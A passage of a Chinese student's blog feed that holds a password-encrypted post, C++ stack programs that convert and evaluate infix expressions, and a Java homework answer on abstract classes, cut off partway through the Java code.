    <url>/2020/11/22/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84-%E7%B2%BE%E7%AE%80%E9%93%BE%E8%A1%A8/</url>
    <content><![CDATA[<div id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">
  <div class="hbe-input-container">
  <input type="password" id="hbePass" placeholder="" />
    <label for="hbePass">请输入密码，密码在LHL那.</label>
    <div class="bottom-line"></div>
  </div>
  <script id="hbeData" type="hbeData" data-hmacdigest="7a6735240d61b6565b8356082d99b54756957f2b450ae4b53348643497c19989">6a1f2b09bd0d086e52ed82deb62037775d7498f0caa89de0c4bccdd655ec4281bc2b6c828a034698224662adcd46a3145b8bc2b4366c4b7cdcc6a9b7bc91ec1c4b936597b404801b5bebd91eff5ca8adfcc419bbeac4db050693326e418222d771dd1ae1b2991de6abce2c119b53d3f04a9b7b9ba88c7231cff99cb89f1d0751052f9da834c8c73752beefd6874002ac0a54c5c01edd5ae5642f9d2b51c6d4779bf2c4edaea89080e02b63192d705677a778a28247455b690164d9757eab90e6b641e042c60f0531d38cd3d9618fe4fdb7f5b93f7c37f74b6f48fa836d733650465534a42975e6944a071a964f2fe6594ce2c03d7f7cedd9f00f25c1b69faf88acfaab1a0df658133c9eb647b6275495c4f86a840806da8c41639d6c6948717d31d712b4411d30951cfa67aee110178f60fcd8e997f014ffe3c18b64d0c5ee9fa802a6bc5bec1bc9bcc0bcc223eee172113b7570dbfc57ffe62e12a9e614ecccef212dbb09d88e1a5fcc32dc17fc8dc10f73e48298c75b47d981040ce1aa9d20017cc7ffa55e46269a2e9483ed90c7cedcfb0d2d4aa8e5ae3611d9c5fbe4ae8342988b57cd272118d07fea6d14f10a103fc4947a8e1652888a56a362472d89afb422a900419d746a68d886eb48ab1b84c099e32d2800089160327bff33ec1d0bc1f8347cb758548c16b9b6c3e4335aea8aea7973149b33c9023cfa073d95329b5c0a48e47b6e24eab4e7767aa0e9adcd71487affb46f31a5cf1e625a361bbbd4911177eb9a94ca787f062353af267cc220919435e28da705e6f87ca78530df740c8b4410ebe3479f95215ee2644a5b20c880b583b0781705426dfa2000025cf2d821c60e48599617244d4608a068fa32deb75fa7c94b9dac206ec9880600e0560c1d4af016faa8b358f086cadef0f8c16ece8e8767947309b169e70630c076900289acd1b461df1bee28f96f070e33b490c839dbb69c004b3f0c0ab359b1de11f170b1cac9d16a76e33f3d1ec441f1263be9cf020a3ca695707f364727da693205cf2c94879fd9ca8f138d3c3529b8c45f040133a7223d4fb8e7fbaffc0cd682584071241845491063a58e4d60f51aebdc7cfd5604ae069a131dcab844b1e1717c5db5b4647fa5398e2fb9c1d556711e14f5ab94ed7a7954752e32dedc203db6799b6268825bbfbf9eef5da45ed1fcb6ab3275f0d47f7a30ad68f1910d7b7bf262a506320cd543d21afce26b612716a73691b0c2b3b8e6ff814c7d4613230073f96366e9cbefaf87c0a4b85ae9e1e188868d9e1a4a5d19256a77be9a2646382e75fd67ab75a6efa2aaf0949d4466541db458151c0dac987b089c8b35b02a2e97fddc2fde492ae531871d6a0da7c75c22063333240e60fb21dd1eb7743aa047b4ed2c741c6df7e9546bb08ee7d8ba3fe82a3c26d371fd11b1bfeeb87e04144bf44b97d0654ec0e98f3f3e257b3bb379d85872ad6f03b93bf2959bdde020382237bb3b5306c68ffe0b218ff28dd5bbb4fd9b3aa8d601d5e8a9056f18b3ce223593b423051762d6acc2280cd5a86ac26cdc069ace54e47c5d19060e6c03d56b5101e9c0a77179cb66caf5e3438bbb56cb4c9e87958b921710c42f01cb46fea11da2b09694f3c00ed1b65a3cf8ea32a5e0548c0df3d9f43ae1ed6a58dffcc847922bd335de487fb7c7bc514bb41997de1865097f0fd15cbd7385c68e0995142ab8763a7d92b16ed25d0c181d5a38c2c310ca167e30ac6033db61b7c3eac7ab4203d465d7c2cc4bc5ad176fd3380b1354eab1d435a7d5dcd7f0535469f4cf16d1fdfe05fa0d7b548bde2f21a5fe048d6b329293261e8d13680b65836c231565041dffd9add5a3d355e8be87b1b79a41148ab72f142609166a7a00e6e5d33a252967871a011c1a462630201e237e043e5ac76d4eb474dfd08d40e679b2f5288c0d1c37f5c857ec27f7bb76bde87c9c03260bf740d4a431f7ebdb9cee58d51c5687307d8610cd8dd80df119c05e05697b5c9bdc1f9b5192a33acd7ff675993e43a2a233465b377a122873fa34bce12150b322c86f91f2faf88f53b6ae306cde75287a6b486bab261ac427c81cc751c2b54d859b71e3dbd73075bfbe108cb6e32df5674ff941fde2fc63916797c1ba1f5e6cf9abfb309e23fb593bfc2d5856649da634cc315b640aa4d039ba016326f1ff9e14b63a9e5b90990b05442155bd5b6f08e294ebe9ad7e3598a22bc2b79f1d5d9e8191f4f037f24aeda0947438ee79a7e76f36c227e467d4c0474358527512b28d905ff450ec367d409c90096c95c33fe1da5e8c68c68bfec4dbe7e3d52f6c9a76ba5a4726c022fcf63f1f97f3396fd59a506209e5c53b1b57b2aed9d58071dfccaf68fceaacfdbd899e4bd6e21010319967d1c532ff1d3c51682bc7323fae5ea6ad24eecff01a93d4b559cbaeedd77601473d1f3a462b099375dcf0a63d2cecf34bf3c4336a030efd1d352cab9c1f2c8041725d31b8687eb68150d7c2526f57b45f05ac839f58b0ad2781391f59be5c19d32099d08dc58336b9c29e66734e8d95bade388d021617aff6c0001e568d0e00d5c8c18b6e5acc01e7c4dc076702aeb5f4a6506a5a94a98b2f5a23eff5a8ff7c582ca6bdf9b486d6f689c98666fe519399c986a09a4bf8a0eaa4d3dfc6e1e3ed6d2bc42e6b78ecaf3004dc6315ba6cd55199a7353dfa273b2fe34e1d546044c7c8715020fe73a94ebf70e9a473f9e4e053d3c766acd5f13427e8b949cf3d5de2ffdc6b7f1e599f69f734d9df0fa91f3af06e7614b3e8f33191418d76004901111c1bd1e6028cdcda86be115af0d78f66302e3fc205fb0895a55d379532ccd2aea0b690cbb69a49dad255c67b756cc1b032af740cba204a9975ccb302ae47cb63f45958e5e43ca93872e5dcf27a567984910d1fda8d0a1a165f99842c23bebbbc8bae88c72b7354e851c7c0bcd9da0ca1c9dd18f38f34db11507c4c1986901bbfd5e630281dc53115ebcb7133c9f48053987b77802dee3d922630b87ef22600fa80dea7af3cfce52c4556feb71cd5e5c7e0a4ac0b95d0a00d8a85c0562e0c1235bf235647c8a7548e0fa567e8864c01f3b0605786b29799094c9c38ea97bdcdaaaa6eedeb1d8412cfe6b604f5a5eb69c69dcfdceeb056ea78cb52adf26428e75574c3c7af8f633a63201cec512db77bb3f79a6a1aa91f5d11ed70f9ebbc0e2d83a9f264b48c711229cb369127a78427c7375b9458e48311b49f28ffc084d1c79580884cb6b5bccb0c9e034db61cd0358cfb18f7d39766f49d8459ccdab0ead7bcf8a842b135d189fe3cb26c3564d743b5fde7520c68005469606f33ecac4926b37972bead7be6c256ce0cb6df0aa42cf35af719b6fc89a5eb91afcbc1ed5f52a659d1fe06f5a06239936f61719532611f3d12d648e7ae47c6742b02aa1fed838872e8d4535868215f1a0d98e5f64e90c57a16d0ae032cd47bba74ca8c9375e93c897e953b4bef4893d4ba6c31d49e1449a6be41fac8d529aea5c4a179d7f22e08ebaa3805d6d3c88dd097ebb5b6dc6b70796fbefe1dc466dbc1aa973758e4fb8e239f746b60db908ba7c63a8f623100d4059f26f2856c4744e7ca7f5532e370e7a35202a564e5f029ed3d686ff377316931e350dabdaa521661f9e85bd87c0cac3ab594c9135d1df7751c9e6d28b464250e2425394adef0aea60b6c5d0b06c33449cc731fed669ed92770eb385707af54f8423bdd23c9a067cd01d60cf2a5b1495f0d714d0fa22657b4ff9e8516cdc38ba10c484babf85ba8770d7b359d869f65204c1aeb4b621cbae8b0ba31983e00c757da3f5eb345360bc136fd149be85c2f661f0a76f903e0b05794cf14a00e9094b6c9de321abdad05aa4b3b72c22fd258d05d087bb52adb51b978a3983ee27d7c894f051e8cd195c0dbc4a615ba7f835c458f3758975072e2be4c6cc43c66765330911348821c63440e88e92abb78602a6fd2c48c205c74101e03592193d4c4e83fdfc4f71b8bde1142540d1942c0c6d7de97e80ac8e038535b31232f59e85f7c21d0830f649f2b9c8890474e694ac3aff8e26a20ad12ddeefdea738039e28d5d7a95cb41a0d9b8775f41ad9f8fc2297592a7110ad41c429e937a14357e8fad01f4776d52bdf6d04c03ce5a2e7d5cf9d016cff2b6e4b749918fcce601c79dd88aee5c5fd49e81672befaf24fe1c950432c10c09ebcf419fdc65a150c629c974b8f0d915a5a95352f85593c2854ef5783a09de64279512a8a255ab183656eebd437addaeaae26427a3088cbf99d963a0d78a59704aadaa7aaf371d3aeea87c0cd9ccfa307397e555b620cb7dc12380d232af652472644afc8faf44690c702bf56918bbd17eefdf5aaeb68032c33de87cdb725871b9028c59c6ad7381eaa56371923ccb2d35b921ffd3231652c94207d6b977e9e12e41be9ce9c24d008a44526c4707838f8c244ffe9e2cf83b6992c0e85eedc0dd40c451612e1b10682ddd8c26d2cca972c670f134a2ac0365f4e4b259e40ffee344027e18fe645f049d859e99337e4b7f7e02ee08ee5fb82f44afd6cdc226d17d7cb696001a02bcf3298ddc065be8b42ad9b9f44ba00ad5c74453c2887922fe5c9306eda6b5fcda58b38afa99b9c4b09dfe9a081f0fbf51b50feb701199551a415c26c28f2af24eb50c540d6649961d3f94e8215234b87d37934816fbb7529b1f3c88bf6ddbb511683e0585d5acd1aa9f0a2da4297df2f029380fcfd8e7c07e06e7c4e2480112689cd4099c8a0ab7092619ba880584722e9cfebb1e19ec3b966b109d4510ab051f111b7dfc953b5224ce872cfcd6599199b8bed5aff3554e5994d9d096c5d38b3f4a99f570ffd18ad00458aecbe9f61b5d84220310c20f04833b200c9c6664293ea4d954849d72a5aa9f7d475379fb915534edec1e35ede72d8bc10d3da7e4cf42d6f963033b1e26f309fdee9dccbeefeed165b707bb0bb0d99d46108f6addde2efc3a3cddb53afa2e05d830ab9de577077cc46fb8a62102ef7f087844bce58d2619c09e04a9ae92f6c203d3a04d5f1dd13bbb0c345694e4e59255835c69a0ac9c7b0edc051b5ea3ffe22042d25a5ac1ce7dce7fd3e551033f939a4f3551e9291cc6197cc513491fc7a58c0f6a07cb80583c0b9df16e9590f112aae3592d627fd1d9ed5bcd76407253f2a29b325788402dda6ca0a6f2e27fb5132b82264427561af5165cdd497c061d67757b26df4dc61a2b1f0aa59bed36d85958c872f29393a698a26ac24a8915542047ade2bfde1e2b7e364e703100e69e2b3ffb26383f2ede0733cf0e0850b56967fa30c0b1b49ca84312cfc6d3ab5a6f82d806299fb9e950dd46fc986216b84d58f22cad2ab7fd73bd858682ce039fedaecb2c7cdf3478d4e7ca8acc20be8d0283b5df11202f01aeab7682442bd5d7adba9fe31e896e587b84ee6b60951c5e97000d094bf0591117ae60648d8950954745c2dd9beabda45a6b8f0ae89f73268fe478b4e7b2a0ead4fb70a948790e21812893b8767cbc00cf7500df38dad02513f365fca2ab0ebdfb9b2e47b6011705e085e43e34b6ac8fa14746a7123dff716fe3f780ac27bc97679566b92b002d64352ec98e4825759e26ce382e24dd791ed20ee3b5efcc406de84dbf7efa4cddfb595a6771c0cf03aaa282ecb75bf5f6de517c9c83d7318ac913c3641f6cc157b4d4873a9d04bc166503c22b52154cfdda3b1893a8876407c439572e3a354b3faaa1130efff71fbade2e46497f2b5da74b3e38b1d644092ff85b8fc638d5035d38906b59ea3b61b58a2dbaca7bdfc3da3225d8f2a42cb45ae02755500341ae8fd5634d9ecee93a9c25af87ce8ee28cf23f1e42fc14f6a3b63b0840aeade0f2d8a30ed121f8891408027cebda43ad2620e9279346a84c3fb225c2d1a091282c9829399f747899e61eef29f6d2abffdb4b0d9504e01dae5cb722b653eff45e1378d086bda41e1d91055971f20873e006fcb83c4f9c73d0e4a80a62e1bca910f7adb2ad873310fd6f2164d8efa1866799babbc96dc116ed6146826efc8366b957e5159b2035321e0bf6076ab1be9e2ace683f934ea3af96a6b1733858121597eaee5a697caf9549e58c97339beccd19f7ff43e3744c7a5603802420585c94fc36cd3fba2d7b7c50292f5c8a374e0acfce34681ccdeb6cb3fbf99b0f0d5bead3cd67533fa8ceae7f447a34374eaf39f735ca93fe5595e1ee88084e1f8d98d8ce506701eb6bf1a41aed44c5a413456cd4aea23b0780d7305796660dfaa8c5cc077ead22f829b582877333096ba5986de3d7f7ebcfe1cc667f03aca7806b121c5da884eafb739198ceb4940f7621c5123fa91242f0b40da3e117f98e945ff3f43c890ca6ce3eb9daf30f6c4d3334d11c22f7d787b39bfcd5bd319ec24a45a4fd9de8295886b20bed5d4f6d47728dbcbd241eefb48ba847f78ec744ed186e7dc82664a767ca8d2e235c7800d3a3c5d26cd57d8cdd105b4ebe897a74e1f65a9ef45f4c536ef8351955d7a6ebe169c1152324429df5131c0bd46e77c41fc871f2df2a6eeeab7c805580823ab5512dad3918429832487bbdee140a725fb6442803a81c417fcb4d572e618d56e18c20f12428d9ec25eb176e828be4e3be878ffc6a6375849360622e2532317563b3f2fcc3b0b9cc258862f4658c62fdcc9db34816f6951f70e7c0c79b6585d1ac98d71dd2478475a6505916b6eb8ddaf729c65c11f8ed595bead5d00b0c4e0161833eed5f91d0a5c79d439dc61a0d8e72daf9105a2abecade16c5b08be494baa3d8dde677ea662910bfcbcd4d050a05cb852c77f053a6b1bf7d72f940bb5b8f5e0b36c4fc42ad8a0c8cb5c9126c0c92ed41aeca953ce2d24a8d0de4d4f85b7a767fbf3aa2b58fd50e9dd00ea6cbce03f242861ca770f35f90a727eafd59bab681cd638737c81a1e7d809ef97332e0fec85f366826adcfafbcd30aee2d9df0155c8838388e10cf5e7cf37f89a036b8304de7ee06d20caa10999346a5fa18ce533a2426fdd6e314b2d76875f4bae649f251de08e8568cb1e26d78c59b7cd598de859cd16fbc50b41d706df123cf5fccc5980e27887f40eef5a1a83d8b6530216b5fa6342168ee9b493d4c1f2f99acec1593fbf78b0f2dcf3960ad74c5b89cb836999398401da7902c3e7c799c97d2478869d75c138dd212cf934072198e0e1008cf1ac2e2e66a7aeef581f85ec19b3cdf93d028ed7329a2da7957403c522e0e7f9b407a85e23a16a816b09340c3708e789b596088ad1f2ff3f8c969e0fa36bbeecb3b3100fa0673b263b6dc</script>
</div>
<script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
  </entry>
  <entry>
    <title>数据结构 中缀表达式转后缀表达式及其计算 V3.1</title>
    <url>/2020/11/22/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84-%E4%B8%AD%E7%BC%80%E8%A1%A8%E8%BE%BE%E5%BC%8F%E8%BD%AC%E5%90%8E%E7%BC%80%E8%A1%A8%E8%BE%BE%E5%BC%8F%E5%8F%8A%E5%85%B6%E8%AE%A1%E7%AE%97/</url>
    <content><![CDATA[<p>数据结构 中缀表达式转后缀表达式及其计算</p>
<a id="more"></a>
<pre class="line-numbers language-none"><code class="language-none">#include &lt;iostream&gt;
#include &lt;stdio.h&gt;
#include &lt;string.h&gt;
using namespace std;
template &lt;typename T&gt;
class SeqStack
&#123;
    T data[100];
    int top;

public:
    SeqStack()
    &#123;
        top &#x3D; -1;
    &#125;
    void Push(T x)
    &#123;
        if (top &#x3D;&#x3D; 99)
            return;
        top++;
        data[top] &#x3D; x;
    &#125;
    T Pop()
    &#123;
        if (top &#x3D;&#x3D; -1)
        &#123;
            return 0;
        &#125;
        T x &#x3D; data[top];
        top--;
        return x;
    &#125;
    T Top()
    &#123;
        if (top &#x3D;&#x3D; -1)
            return 0;
        return data[top];
    &#125;
    int Empty()
    &#123;
        return top &#x3D;&#x3D; -1;
    &#125;
    void clean()
    &#123;
        top &#x3D; -1;
    &#125;
    void allPop(SeqStack &amp;s)
    &#123;
        while (top !&#x3D; -1)
        &#123;
            cout &lt;&lt; s.Pop() &lt;&lt; &#39; &#39;;
        &#125;
    &#125;
&#125;;
int first(char c)
&#123;
    switch (c)
    &#123;
    case &#39;+&#39;:
    case &#39;-&#39;:
        return 1;
    case &#39;*&#39;:
    case &#39;&#x2F;&#39;:
        return 2;
    default:
        return -1;
    &#125;
&#125;
void jisuan(string &amp;s, SeqStack&lt;char&gt; &amp;cc, SeqStack&lt;double&gt; &amp;ii)
&#123;
    double x, y;
    y &#x3D; ii.Pop();
    x &#x3D; ii.Pop();
    char fh &#x3D; &#39;0&#39;;
    fh &#x3D; cc.Pop();
    if (fh &#x3D;&#x3D; &#39;+&#39;)
        ii.Push(x + y);
    else if (fh &#x3D;&#x3D; &#39;-&#39;)
        ii.Push(x - y);
    else if (fh &#x3D;&#x3D; &#39;*&#39;)
        ii.Push(x * y);
    else if (fh &#x3D;&#x3D; &#39;&#x2F;&#39;)
        ii.Push(x &#x2F; y);
&#125;

int main()
&#123;
    cout &lt;&lt; &quot;请输入中缀表达式:&quot; &lt;&lt; endl;
    SeqStack&lt;char&gt; cc;
    SeqStack&lt;double&gt; ii;
    string s;
    double t;
    cin &gt;&gt; s;
    cout &lt;&lt; &quot;转化的后缀表达式为:&quot; &lt;&lt; endl;
    int i, j, k;
    int f &#x3D; 1;
    for (i &#x3D; 0; i &lt; s.length();)
    &#123;
        if (s[i] &#x3D;&#x3D; &#39; &#39;)
            i++;
        if (s[i] &gt;&#x3D; &#39;0&#39; &amp;&amp; s[i] &lt;&#x3D; &#39;9&#39;)
        &#123;

            ii.Push(s[i] - &#39;0&#39;);
            cout &lt;&lt; s[i++];
        &#125;

        if (s[i] &#x3D;&#x3D; &#39;+&#39; || s[i] &#x3D;&#x3D; &#39;-&#39; || s[i] &#x3D;&#x3D; &#39;*&#39; || s[i] &#x3D;&#x3D; &#39;&#x2F;&#39;)
        &#123;
            if (cc.Empty() || (i &gt; 0 &amp;&amp; cc.Top() &#x3D;&#x3D; &#39;(&#39;))
            &#123;
                cc.Push(s[i++]);
            &#125;

            else if (first(cc.Top()) &lt; first(s[i]))
            &#123;
                cc.Push(s[i++]);
            &#125;
            else
            &#123;
                cout &lt;&lt; cc.Pop();
            &#125;
        &#125;
        else if (s[i] &#x3D;&#x3D; &#39;(&#39;)
        &#123;
            cc.Push(s[i++]);
        &#125;

        else if (s[i] &#x3D;&#x3D; &#39;)&#39;)
        &#123;
            while (cc.Top() !&#x3D; &#39;(&#39;)
                cout &lt;&lt; cc.Pop();
            cc.Pop();
            i++;
        &#125;
    &#125;
    while (!cc.Empty())
        cout &lt;&lt; cc.Pop();
    cout &lt;&lt; endl;
    ii.clean();
    cc.clean();
    for (i &#x3D; 0; i &lt; s.length();)
    &#123;

        if (s[i] &#x3D;&#x3D; &#39; &#39;)
            i++;
        &#x2F;&#x2F;大于9的数字运算
        else if (s[i] &gt;&#x3D; &#39;0&#39; &amp;&amp; s[i] &lt;&#x3D; &#39;9&#39;)
        &#123;
            if (i &gt; 0 &amp;&amp; (s[i - 1] &gt;&#x3D; &#39;0&#39; &amp;&amp; s[i - 1] &lt;&#x3D; &#39;9&#39;))
            &#123;
                t &#x3D; s[i++] - &#39;0&#39; + ii.Pop() * 10;
                ii.Push(t * f);
                f &#x3D; 1;
            &#125;
            else
            &#123;
                ii.Push((s[i++] - &#39;0&#39;) * f);
                f &#x3D; 1;
            &#125;
        &#125;
        else if (f &#x3D;&#x3D; 1 &amp;&amp; (s[i] &#x3D;&#x3D; &#39;+&#39; || s[i] &#x3D;&#x3D; &#39;-&#39; || s[i] &#x3D;&#x3D; &#39;*&#39; || s[i] &#x3D;&#x3D; &#39;&#x2F;&#39;))
        &#123;
            if (cc.Empty())
            &#123;
                cc.Push(s[i++]);
            &#125;

            else if (first(cc.Top()) &lt; first(s[i]))
            &#123;
                cc.Push(s[i++]);
            &#125;
            else
            &#123;
                jisuan(s, cc, ii);
            &#125;
        &#125;
        else if (s[i] &#x3D;&#x3D; &#39;(&#39;)
        &#123;
            cc.Push(s[i++]);
            if (s[i] &#x3D;&#x3D; &#39;-&#39;) &#x2F;&#x2F; 负数表示
            &#123;
                f &#x3D; -1;
                i++;
            &#125;
        &#125;

        else if (s[i] &#x3D;&#x3D; &#39;)&#39;)
        &#123;
            while (cc.Top() !&#x3D; &#39;(&#39;)
                jisuan(s, cc, ii);
            cc.Pop();
            i++;
        &#125;
    &#125;
    while (!cc.Empty())
    &#123;
        jisuan(s, cc, ii);
    &#125;
    cout &lt;&lt; ii.Pop();
&#125;

<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
]]></content>
  </entry>
  <entry>
    <title>数据结构 中缀表达式计算 V2.1.4</title>
    <url>/2020/11/22/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84-%E4%B8%AD%E7%BC%80%E8%A1%A8%E8%BE%BE%E5%BC%8F%E8%AE%A1%E7%AE%97/</url>
    <content><![CDATA[<p>数据结构 中缀表达式计算<br>输入为整数，结果可为小数,可实现输入为负数</p>
<a id="more"></a>
<pre class="line-numbers language-none"><code class="language-none">#include &lt;iostream&gt;
#include &lt;stdio.h&gt;
#include &lt;string.h&gt;
using namespace std;
template &lt;typename T&gt;
class SeqStack
&#123;
    T data[100];
    int top;

public:
    SeqStack()
    &#123;
        top &#x3D; -1;
    &#125;
    void Push(T x)
    &#123;
        if (top &#x3D;&#x3D; 99)
            return;
        top++;
        data[top] &#x3D; x;
    &#125;
    T Pop()
    &#123;
        if (top &#x3D;&#x3D; -1)
        &#123;
            return 0;
        &#125;
        T x &#x3D; data[top];
        top--;
        return x;
    &#125;
    T Top()
    &#123;
        if (top &#x3D;&#x3D; -1)
            return 0;
        return data[top];
    &#125;
    int Empty()
    &#123;
        return top &#x3D;&#x3D; -1;
    &#125;
    void clean()
    &#123;
        top &#x3D; -1;
    &#125;
    void allPop(SeqStack &amp;s)
    &#123;
        while (top !&#x3D; -1)
        &#123;
            cout &lt;&lt; s.Pop() &lt;&lt; &#39; &#39;;
        &#125;
    &#125;
&#125;;
int first(char c)
&#123;
    switch (c)
    &#123;
    case &#39;)&#39;:
    case &#39;+&#39;:
    case &#39;-&#39;:
        return 1;
    case &#39;*&#39;:
    case &#39;&#x2F;&#39;:
        return 2;
    case &#39;(&#39;:

        return 0;
    default:
        return -1;
    &#125;
&#125;
void jisuan(string &amp;s, SeqStack&lt;char&gt; &amp;cc, SeqStack&lt;double&gt; &amp;ii)
&#123;
    double x, y;
    y &#x3D; ii.Pop();
    x &#x3D; ii.Pop();
    char fh &#x3D; &#39;0&#39;;
    fh &#x3D; cc.Pop();
    if (fh &#x3D;&#x3D; &#39;+&#39;)
        ii.Push(x + y);
    else if (fh &#x3D;&#x3D; &#39;-&#39;)
        ii.Push(x - y);
    else if (fh &#x3D;&#x3D; &#39;*&#39;)
        ii.Push(x * y);
    else if (fh &#x3D;&#x3D; &#39;&#x2F;&#39;)
        ii.Push(x &#x2F; y);
&#125;

int main()
&#123;
	cout&lt;&lt;&quot;请输入中缀表达式:&quot;&lt;&lt;endl;
    SeqStack&lt;char&gt; cc;
    SeqStack&lt;double&gt; ii;
    string s;
    double t;
    cin &gt;&gt; s;
    int f&#x3D;1;&#x2F;&#x2F; 负数表示 
    int i &#x3D; 0, j, k;
    for (i &#x3D; 0; i &lt; s.length();)
    &#123;

		if(s[i]&#x3D;&#x3D;&#39; &#39;)
			i++;	
		&#x2F;&#x2F;大于9的数字运算
        else if (s[i] &gt;&#x3D; &#39;0&#39; &amp;&amp; s[i] &lt;&#x3D; &#39;9&#39;)
        &#123;
            if (i &gt; 0 &amp;&amp; (s[i - 1] &gt;&#x3D; &#39;0&#39; &amp;&amp; s[i - 1] &lt;&#x3D; &#39;9&#39;))
            &#123;
                t &#x3D; s[i++] - &#39;0&#39; + ii.Pop() * 10;
                ii.Push(t*f);
                f&#x3D;1;
            &#125;
            else
            &#123;
            	ii.Push((s[i++] - &#39;0&#39;)*f);
            	f&#x3D;1;
			&#125;
                
        &#125;
        else if (f&#x3D;&#x3D;1&amp;&amp;(s[i] &#x3D;&#x3D; &#39;+&#39; || s[i] &#x3D;&#x3D; &#39;-&#39; || s[i] &#x3D;&#x3D; &#39;*&#39; || s[i] &#x3D;&#x3D; &#39;&#x2F;&#39;))
        &#123;
            if (cc.Empty())
            &#123;
                cc.Push(s[i++]);
            &#125;
            
            else if (first(cc.Top()) &lt; first(s[i]))
            &#123;
                cc.Push(s[i++]);
            &#125;
            else
            &#123;
                jisuan(s,cc,ii);
            &#125;
        &#125;
        else if(s[i]&#x3D;&#x3D;&#39;(&#39;)
        &#123;
			cc.Push(s[i++]);
        	if(s[i]&#x3D;&#x3D;&#39;-&#39;)&#x2F;&#x2F; 负数表示 
        	&#123;
        		f&#x3D;-1;
        		i++;
			&#125;
        		
		&#125;
        	
        else if(s[i]&#x3D;&#x3D;&#39;)&#39;)
        &#123;
        	while(cc.Top()!&#x3D;&#39;(&#39;)
        	jisuan(s,cc,ii);
        	cc.Pop();
        	i++;
		&#125;
        
    &#125;
    while (!cc.Empty())
    &#123;
        jisuan(s, cc, ii);
    &#125;
    cout &lt;&lt; ii.Pop();

    return 0;
&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
  </entry>
  <entry>
    <title>Java 作业3</title>
    <url>/2020/11/18/Java-%E4%BD%9C%E4%B8%9A3/</url>
    <content><![CDATA[<p>包含两张图片和填空题</p>
<a id="more"></a>
<h2 id=""><a href="#" class="headerlink" title=""></a><img src="/photo/java-4.png" alt=" "></h2><p><img src="/photo/java-4-2.png" alt=" "></p>
<pre class="line-numbers language-none"><code class="language-none">4-1
abstract class Animal &#123;
    void cry() &#123;

    &#125;

    String getName() &#123;
        return null;
    &#125;
&#125;
class Dog extends Animal &#123;
    private String name;
    Dog(String name) &#123;
        this.name &#x3D; name;
    &#125;
    @Override
    public void cry() &#123;
        System.out.println(&quot;汪汪&quot;);
    &#125;
    @Override
    public String  getName() &#123;
        return &quot;我的名字叫&quot;+name;
    &#125;
&#125;
public class SimulateTest
&#123;
    public static void main(String[] args) &#123;
        Animal dog &#x3D; new Dog(&quot; Bob &quot;);
                System.out.println(dog.getName());
                dog.cry();
    &#125;

&#125;
4-2
import java.awt.*;

&#x2F;&#x2F;
public class Main
&#123;

    public static void main(String args[])
    &#123;
        Shape ss[] &#x3D;new Shape[4] ;

        ss[0] &#x3D; new Rect(10,10);
        ss[1] &#x3D; new Rect(8, 12);
        ss[2] &#x3D; new Circle(5);
        ss[3] &#x3D; new Circle(6);

        for(int i &#x3D; 0; i &lt; ss.length; i++)
        &#123;
            System.out.println(ss[i].getArea());
        &#125;

    &#125;

&#125;

abstract class Shape
&#123;
    abstract int getArea();
&#125;

class Rect extends Shape
&#123;
    int     width;
    int     height;

    Rect(int width, int height)
    &#123;
        this.width &#x3D; width;
        this.height &#x3D; height;
    &#125;

    int getArea()
    &#123;
        return width * height;
    &#125;
&#125;

class Circle extends Shape
&#123;
    int radius;

    Circle(int radius)
    &#123;
        this.radius&#x3D;radius;
    &#125;

